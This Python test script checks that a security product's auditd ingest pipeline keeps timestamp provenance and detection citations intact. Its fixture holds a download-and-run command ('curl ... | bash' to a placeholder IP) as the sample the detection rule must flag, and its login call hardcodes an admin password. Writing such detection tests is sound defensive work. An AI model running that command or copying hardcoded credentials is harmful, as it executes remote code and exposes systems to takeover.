#!/usr/bin/env python3
"""D11 · ingest-path provenance over real HTTP (PREVIEW ONLY).

Proves the chain the owner asked for, end to end and over the wire:

  raw auditd record -> collector envelope -> NivX HTTP receipt
  -> stored raw row -> parser -> canonical event -> D4 stitch
  -> rule evaluation -> D8 citation -> back to the original record

and that every available timestamp carries its OWN source and basis, with no
boundary borrowing another's value.

EVIDENCE LABELLING
  REPLAYED REAL EVIDENCE — the EXECVE line is the verbatim auditd line
  already present in stored canonical evidence from the earlier acceptance
  run.
  TEST/SYNTHETIC — the SYSCALL/PROCTITLE companions, the tenant
  `t-d11-proof`, and the collector/key minted here.
  NOT LIVE — no real auditd host is connected. Nothing touches production.
"""
from __future__ import annotations

import json
import os
import time
import urllib.error
import urllib.request

from dotenv import load_dotenv

load_dotenv("/app/backend/.env")
load_dotenv("/app/frontend/.env")
BASE = os.environ["REACT_APP_BACKEND_URL"].rstrip("/")
UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/126.0"
TENANT = "t-d11-proof"
STAMP = int(time.time())
AUD = f"1757452888.555:{7000 + STAMP % 900}"
AUD_B = f"1757452888.777:{7900 + STAMP % 90}"

SYSCALL = (f'node=web-prod-04 type=SYSCALL msg=audit({AUD}): arch=c000003e '
           f'syscall=59 success=yes exit=0 ppid=1234 pid=5678 auid=1000 '
           f'uid=0 euid=0 comm="bash" exe="/usr/bin/bash" key="exec"')
EXECVE = (f'type=EXECVE msg=audit({AUD}): argc=3 a0="/bin/bash" a1="-c" '
          f'a2="curl -s http://198.51.100.9/x.sh | bash"')
PROCTITLE = (f'type=PROCTITLE msg=audit({AUD}): '
             f'proctitle=2F62696E2F62617368002D63')
# a second execution, delivered with NO collector timestamps at all
BARE = (f'node=web-prod-04 type=SYSCALL msg=audit({AUD_B}): arch=c000003e '
        f'syscall=59 success=yes exit=0 ppid=1 pid=999 auid=1000 uid=0 '
        f'euid=0 comm="bash" exe="/usr/bin/bash" key="exec"')

SENSOR_TS = "2026-06-01T10:00:01.250000+00:00"
COLLECTOR_TS = "2026-06-01T10:00:02.500000+00:00"

ok = True


def check(label, cond, detail=""):
    global ok
    ok = ok and bool(cond)
    print(f"  [{'PASS' if cond else 'FAIL'}] {label}"
          + (f" — {detail}" if detail else ""))


def call(path, method="GET", token=None, key=None, tenant=None, body=None):
    h = {"User-Agent": UA, "Content-Type": "application/json"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    if key:
        h["X-XDR-API-Key"] = key
    if tenant:
        h["X-Tenant-Id"] = tenant
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h,
                               method=method)
    try:
        with urllib.request.urlopen(r, timeout=60) as resp:
            return resp.status, json.loads(resp.read() or b"{}")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:400]


def show(ts):
    for name in ("activity_occurred_at", "sensor_observed_at",
                 "collector_received_at", "nivx_received_at", "parsed_at",
                 "normalized_at", "rule_evaluated_at", "verdict_at"):
        s = ts.get(name) or {}
        val = s.get("value") or s.get("reason") or ""
        print(f"    {name:22s} {s.get('status',''):15s} "
              f"{str(val)[:44]:46s} {s.get('source') or ''}")


def main() -> int:
    code, body = call("/api/auth/login", "POST", body={
        "email": "admin@nivxray.com",
        "password": "uulVDp5cCSB3Hva99s7UUAwK"})
    if code != 200:
        print(f"login failed: {code} {body}")
        return 1
    token = body.get("access_token")
    print("login: 200\n")

    print("1 · provision TEST collector + ingest key (preview, TEST tenant)")
    code, body = call("/api/xdr/collectors", "POST", token=token,
                      tenant=TENANT, body={
                          "name": "d11-proof-collector",
                          "protocol": "syslog",
                          "authorized_sources": ["linux-auditd"],
                          "tenant_id": TENANT,
                          "confirm_tenant_id": TENANT,
                          "allow_new_tenant": True})
    if code == 409:
        _, lst = call("/api/xdr/collectors", token=token, tenant=TENANT)
        col_id = next((c["id"] for c in
                       ((lst.get("data") or {}).get("collectors") or [])
                       if c.get("name") == "d11-proof-collector"), None)
        print("  reusing existing test collector")
    elif code not in (200, 201):
        print(f"  collector create -> {code} {body}")
        return 1
    else:
        col = (body.get("data") or body)
        col_id = col.get("id") or (col.get("collector") or {}).get("id")
    check("collector created", bool(col_id), col_id)
    if col_id:
        # D15 · re-assert the declared-source allowlist on reuse.
        call(f"/api/xdr/collectors/{col_id}", "PUT", token=token,
             tenant=TENANT, body={"authorized_sources": ["linux-auditd"]})

    code, body = call("/api/xdr/api-keys", "POST", token=token,
                      tenant=TENANT, body={
                          "name": f"d11-proof-key-{STAMP}",
                          "confirm_tenant_id": TENANT,
                          "allow_new_tenant": True,
                          "scopes": ["collectors.enroll", "collectors.read"]})
    if code not in (200, 201):
        print(f"  key create -> {code} {body}")
        return 1
    _d = body.get("data") or {}
    key = (_d.get("api_key") or _d.get("key") or _d.get("secret")
           or _d.get("plaintext") or _d.get("token") or _d.get("value")
           or body.get("api_key"))
    check("ingest key minted (value not printed)", bool(key))
    if not key:
        return 1

    print("\n2 · POST one execution WITH collector timestamps, one WITHOUT")
    t_before = time.time()
    envs = [{"tenant_id": TENANT, "collector_id": col_id,
             "source_event_id": f"auditd:{AUD}:{name}",
             "collection_method": "syslog", "source": "d11-proof-host",
             "declared_source": "linux-auditd",
             "source_timestamp": SENSOR_TS,
             "received_at": COLLECTOR_TS,
             "raw": {"line": line, "payload_format": "auditd"}}
            for name, line in (("syscall", SYSCALL), ("execve", EXECVE),
                               ("proctitle", PROCTITLE))]
    envs.append({"tenant_id": TENANT, "collector_id": col_id,
                 "source_event_id": f"auditd:{AUD_B}:syscall",
                 "collection_method": "syslog", "source": "d11-proof-host",
                 "declared_source": "linux-auditd",
                 "raw": {"line": BARE, "payload_format": "auditd"}})
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TENANT, body={"envelopes": envs})
    t_after = time.time()
    check("ingest accepted", code == 200, f"HTTP {code}")
    if code != 200:
        print(f"  {body}")
        return 1
    data = body.get("data") or body
    outcomes = (data.get("reasoning") if isinstance(data, dict) else None) or []
    print(f"  outcomes: {[o.get('status') for o in outcomes]}")

    print("\n3 · canonical provenance — timestamped delivery")
    time.sleep(2)
    from pymongo import MongoClient
    db = MongoClient(os.environ["MONGO_URL"])[os.environ["DB_NAME"]]
    ev = db.xdr_canonical_evidence.find_one({"tenant_id": TENANT,
                                             "source_event_id": AUD})
    check("one canonical event for the stitched execution", bool(ev))
    if not ev:
        return 1
    ts = ((ev.get("provenance") or {}).get("timestamps") or {})
    show(ts)

    check("all eight boundaries present", len(ts) == 8, str(len(ts)))
    check("activity time comes from the audit header",
          ts["activity_occurred_at"]["status"] == "AVAILABLE"
          and ts["activity_occurred_at"]["source"]
          == "auditd:msg=audit(epoch:serial)")
    check("sensor observation comes from the envelope, not from us",
          ts["sensor_observed_at"]["status"] == "AVAILABLE"
          and ts["sensor_observed_at"]["value"] == SENSOR_TS
          and ts["sensor_observed_at"]["source"]
          == "collector:envelope.source_timestamp")
    check("collector receipt comes from the envelope",
          ts["collector_received_at"]["status"] == "AVAILABLE"
          and ts["collector_received_at"]["value"] == COLLECTOR_TS
          and ts["collector_received_at"]["source"]
          == "collector:envelope.received_at")
    check("NivX receipt is the HTTP boundary",
          ts["nivx_received_at"]["status"] == "AVAILABLE"
          and ts["nivx_received_at"]["source"]
          == "ingest:http receipt POST /api/xdr/ingest/telemetry")
    from datetime import datetime
    recv = datetime.fromisoformat(ts["nivx_received_at"]["value"]).timestamp()
    check("the NivX receipt really is when we received it",
          t_before - 2 <= recv <= t_after + 2,
          f"{recv:.3f} in [{t_before:.3f}, {t_after:.3f}]")
    check("no boundary equals another by substitution",
          len({ts[n]["value"] for n in
               ("activity_occurred_at", "sensor_observed_at",
                "collector_received_at", "nivx_received_at")}) == 4)
    order = [ts[n]["value"] for n in
             ("activity_occurred_at", "sensor_observed_at",
              "collector_received_at", "nivx_received_at", "parsed_at",
              "normalized_at", "rule_evaluated_at", "verdict_at")]
    check("stages are ordered as they happened",
          all(a <= b for a, b in zip(order, order[1:])), str(order))
    add = ev.get("additional_fields") or {}
    check("event_time is declared as real activity time",
          add.get("event_time_basis") == "ACTIVITY_TIME"
          and add.get("event_time_substituted") is False
          and add.get("audit_timestamp_state") == "OBSERVED")

    print("\n4 · delivery identity and raw-envelope drill-down")
    ing = (ev.get("provenance") or {}).get("ingest") or {}
    print(f"    path_kind        : {ing.get('path_kind')}")
    print(f"    collector_id     : {ing.get('collector_id')}")
    print(f"    tenant_id        : {ing.get('tenant_id')}")
    print(f"    source_label     : {ing.get('source_label')}")
    print(f"    raw_envelope_ref : {ing.get('raw_envelope_ref')}")
    check("path is recorded as collector-delivered",
          ing.get("path_kind") == "COLLECTOR_DELIVERED")
    check("collector identity is attributed, not assumed",
          ing.get("collector_id") == col_id
          and "verified against xdr_collectors.tenant_id"
          in (ing.get("collector_id_source") or ""))
    check("tenant attribution names its proof",
          ing.get("tenant_id") == TENANT
          and "X-Tenant-Id" in (ing.get("tenant_id_source") or ""))
    check("the collector's origin label is marked a CLAIM",
          "CLAIM" in (ing.get("source_label_source") or ""))
    from bson import ObjectId
    ref = ing.get("raw_envelope_ref") or {}
    raw_row = None
    if ref.get("id"):
        try:
            raw_row = db.xdr_canonical_events.find_one(
                {"_id": ObjectId(ref["id"])})
        except Exception:                                      # noqa: BLE001
            raw_row = None
    check("the cited raw row exists and is the same delivery",
          bool(raw_row) and raw_row.get("tenant_id") == TENANT
          and raw_row.get("collector_id") == col_id)
    check("the raw row records the same NivX receipt instant",
          bool(raw_row) and raw_row.get("nivx_received_at")
          == ts["nivx_received_at"]["value"])
    check("the raw row declares whether received_at was substituted",
          bool(raw_row) and raw_row.get("received_at_substituted") is False
          and raw_row.get("received_at_source")
          == "collector:envelope.received_at")
    check("all three contributing audit records are still reachable",
          len(ev.get("evidence_refs") or []) == 3)

    print("\n5 · canonical provenance — delivery with NO collector times")
    # the unstitched path keeps only the audit SERIAL as source_event_id, so
    # the verbatim line is the unambiguous handle here
    ev2 = db.xdr_canonical_evidence.find_one({"tenant_id": TENANT,
                                              "raw_ref.line": BARE})
    check("the bare delivery produced a canonical event", bool(ev2))
    if ev2:
        ts2 = ((ev2.get("provenance") or {}).get("timestamps") or {})
        show(ts2)
        check("activity time is STILL real — it is in the record itself",
              ts2["activity_occurred_at"]["status"] == "AVAILABLE")
        check("sensor observation stays NOT_OBSERVED",
              ts2["sensor_observed_at"]["status"] == "NOT_OBSERVED"
              and ts2["sensor_observed_at"]["value"] is None)
        check("collector receipt stays NOT_OBSERVED",
              ts2["collector_received_at"]["status"] == "NOT_OBSERVED"
              and ts2["collector_received_at"]["value"] is None)
        check("the NivX receipt was NOT copied into the empty boundaries",
              ts2["nivx_received_at"]["value"]
              not in (ts2["sensor_observed_at"]["value"],
                      ts2["collector_received_at"]["value"],
                      ts2["activity_occurred_at"]["value"]))

    print("\n6 · a malformed collector timestamp becomes MISSING, not a value")
    aud_c = f"1757452888.999:{7950 + STAMP % 40}"
    bad_line = (f'node=web-prod-04 type=SYSCALL msg=audit({aud_c}): '
                f'arch=c000003e syscall=59 uid=0 euid=0 comm="bash" '
                f'exe="/usr/bin/bash" key="exec"')
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TENANT, body={"envelopes": [{
                          "tenant_id": TENANT, "collector_id": col_id,
                          "source_event_id": f"auditd:{aud_c}:syscall",
                          "collection_method": "syslog",
                          "source": "d11-proof-host",
                          "declared_source": "linux-auditd",
                          "source_timestamp": "yesterday afternoon",
                          "raw": {"line": bad_line,
                                  "payload_format": "auditd"}}]})
    check("ingest accepted the malformed-timestamp delivery", code == 200,
          f"HTTP {code}")
    time.sleep(2)
    ev3 = db.xdr_canonical_evidence.find_one({"tenant_id": TENANT,
                                              "raw_ref.line": bad_line})
    check("it produced a canonical event", bool(ev3))
    if ev3:
        s = (((ev3.get("provenance") or {}).get("timestamps")
              or {}).get("sensor_observed_at") or {})
        print(f"    sensor_observed_at -> {s.get('status')} :: "
              f"{str(s.get('reason'))[:90]}")
        check("unreadable value is MISSING and says why",
              s.get("status") == "MISSING" and s.get("value") is None
              and "not a parseable ISO-8601" in (s.get("reason") or ""))

    print("\n7 · a replayed delivery creates no second chain")
    code, body = call("/api/xdr/ingest/telemetry", "POST", key=key,
                      tenant=TENANT, body={"envelopes": envs[:1]})
    data = body.get("data") or body if code == 200 else {}
    st = [o.get("status") for o in (data.get("reasoning") or [])]
    check("the retry is recognised as a duplicate", code == 200
          and any(x in ("DUPLICATE", "DUPLICATE_NEEDS_REVIEW", "IN_FLIGHT")
                  for x in st), f"HTTP {code} {st}")
    n = db.xdr_canonical_evidence.count_documents(
        {"tenant_id": TENANT, "source_event_id": AUD})
    check("still exactly one canonical event for that execution", n == 1,
          str(n))

    print("\n8 · D8 citation still works after the provenance change")
    code, body = call(
        f"/api/xdr/detections/{ev['event_id']}/citations?tenant={TENANT}",
        token=token)
    check("citations endpoint 200", code == 200,
          f"HTTP {code} {str(body)[:120]}")
    cits = ((body.get("data") or {}).get("citations") or []) \
        if code == 200 else []
    check("a citation exists for the stitched event", bool(cits))
    if cits:
        c = cits[0]
        print(f"    rule {c['rule_id']} v{c['rule_version']}")
        for cond in c["evaluated_conditions"]:
            print(f"      [{cond['result']:10s}] "
                  f"{cond['canonical_field']:22s} "
                  f"observed={str(cond['observed_value'])[:44]!r}")
        check("the citation still cites the stitched command line",
              any("curl -s http://198.51.100.9/x.sh | bash"
                  in str(x["observed_value"])
                  for x in c["evaluated_conditions"]
                  if x["result"] == "MATCH"))

    print("\n" + ("D11 INGEST PATH PROVENANCE: PASS" if ok
                  else "D11 INGEST PATH PROVENANCE: FAIL"))
    print("Evidence labels — REPLAYED REAL EVIDENCE (EXECVE line) + "
          "TEST/SYNTHETIC (everything else). NOT LIVE. Preview only.")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main())
